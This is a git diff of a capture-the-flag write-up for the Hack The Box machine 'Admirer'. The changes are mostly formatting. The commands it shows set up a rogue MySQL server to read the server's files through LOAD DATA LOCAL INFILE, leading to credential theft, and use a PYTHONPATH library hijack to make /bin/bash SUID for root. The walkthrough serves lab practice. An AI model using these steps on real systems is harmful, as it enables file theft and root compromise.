@@ -4,7 +4,7 @@
 **Machine name:** Admirer  
 **IP:** 10.10.10.187  
 **Written by:** Adir Biran  
-**Tools:** Nmap, Gobuster, MySQL  
+**Tools and Techniques:** Nmap, Gobuster, MySQL, CVE, Library Hijacking    
 **Method:** Enumerating the services to get credentials for FTP and investigating the files for a CVE.  
 Gaining initial access to the machine through SSH and escalating privileges with library hijacking attack.  
 
@@ -92,7 +92,10 @@ dump.sql
 Database name is admirerdb and the type is mariadb 10.1.41.  
 
 Untar the html.tar.gz file:  
-**tar -zxvf html.tar.gz**  
+
+```
+tar -zxvf html.tar.gz  
+```
 
 Files after extraction:  
 <p align="center">
@@ -190,37 +193,52 @@ https://podalirius.net/en/cves/2021-xxxxx/
 For that exploit to work, we need to create a SQL database on our local machine, connect to it from the admirer's login page and read files on the server.  
 
 On the local machine, start the mysql service:  
+
+```
 sudo systemctl start mysql    
+```
+
 <p align="center">
 <img width="133" alt="26" src="https://user-images.githubusercontent.com/21021400/144714173-3a00d2b1-e7b9-448c-801c-141ab5fd096b.png">
 </p>
 
 Connect to sql:  
+```
 mysql -u root -p    
+```
+
 <p align="center">
 <img width="320" alt="27" src="https://user-images.githubusercontent.com/21021400/144714175-0c763da5-4d45-4b05-ac36-bbeac308fbd8.png">
 </p>
 
 Create the admirer database:  
+```
 CREATE DATABASE admirer;    
+```
 <p align="center">
 <img width="185" alt="28" src="https://user-images.githubusercontent.com/21021400/144714176-a2bb05b6-591a-429e-a701-fdf403c8925d.png">
 </p>
 
 Use the admirer database:  
+```
 USE admirer;    
+```
 <p align="center">
 <img width="129" alt="29" src="https://user-images.githubusercontent.com/21021400/144714177-126deea6-1260-49a5-82f1-86dbd1653131.png">
 </p>
 
 Create a table:  
+```
 CREATE TABLE getfile(content varchar(256));    
+```
 <p align="center">
 <img width="259" alt="30" src="https://user-images.githubusercontent.com/21021400/144714178-3bc57a5c-4a29-4dc4-93f4-4e9a0cabd85e.png">
 </p>
 
 Allow access from the admirer machine:  
+```
 GRANT ALL PRIVILEGES ON *.* TO root@10.10.10.187 IDENTIFIED BY 'toor';    
+```
 <p align="center">
 <img width="366" alt="31" src="https://user-images.githubusercontent.com/21021400/144714179-f9dc368f-8244-4bfa-a3de-a3ab960e6af9.png">
 </p>
@@ -232,7 +250,9 @@ edit the file /etc/mysql/mariadb.conf.d/50-server.cnf and set bind-address = 0.0
 </p>
 
 Restart the mysql service:  
+```
 sudo systemctl restart mysql    
+```
 
 Login using the local machine's IP, credentials for db and db's name created previously.  
 <p align="center">
@@ -246,7 +266,9 @@ and we're in.
 </p>
 
 Navigating to the SQL Command button on the top left and executing the following command to read /etc/passwd as POC:  
+```
 LOAD DATA local INFILE '/etc/passwd' INTO TABLE getfile fields TERMINATED BY "\n";  
+```
 <p align="center">
 <img width="336" alt="35" src="https://user-images.githubusercontent.com/21021400/144714159-153355b2-4193-4ae9-8ed8-2392dba65a5c.png">
 </p>
@@ -254,7 +276,9 @@ LOAD DATA local INFILE '/etc/passwd' INTO TABLE getfile fields TERMINATED BY "\n
 Failed.
 
 Try to read the index.php file of the website (currently we're in /utility-scripts):  
+```
 LOAD DATA local INFILE '../index.php' INTO TABLE getfile fields TERMINATED BY "\n";  
+```
 <p align="center">
 <img width="311" alt="36" src="https://user-images.githubusercontent.com/21021400/144714160-86af1026-f922-4635-9d87-cfadeea5ef4b.png">
 </p>
@@ -262,7 +286,9 @@ LOAD DATA local INFILE '../index.php' INTO TABLE getfile fields TERMINATED BY "\
 It worked.  
 
 Then, read the content of index.php by selecting getfile table created earlier:  
+```
 SELECT * FROM getfile;  
+```
 <p align="center">
 <img width="632" alt="37" src="https://user-images.githubusercontent.com/21021400/144714162-f370f3e4-cad4-4bb3-9658-c5d857bb5f81.png">
 </p>
@@ -278,7 +304,9 @@ Trying to connect to the machine through SSH with those credentials:
 ## Privilege Escalation (waldo -> root)
 
 Check sudo privileges:
+```
 sudo -l  
+```
 <p align="center">
 <img width="390" alt="39" src="https://user-images.githubusercontent.com/21021400/144714181-af070e49-5499-404c-b12e-f89cb667361c.png">
 </p>
@@ -326,7 +354,9 @@ When we will run admin_tasks.sh as sudo with #6 command, the backup.py file will
 Once executed, it will look for make_archive function from shutil.py that we located in /tmp, which will result in adding SUID to /bin/bash.  
 
 The last step is running the admin_tasks.sh as sudo with #6 command and passing /tmp directory as PYTHONPATH:  
+```
 sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh 6  
+```
 <p align="center">
 <img width="265" alt="46" src="https://user-images.githubusercontent.com/21021400/144714189-a873eff9-55b9-42c4-99b3-9ad7d13f1200.png">
 </p>
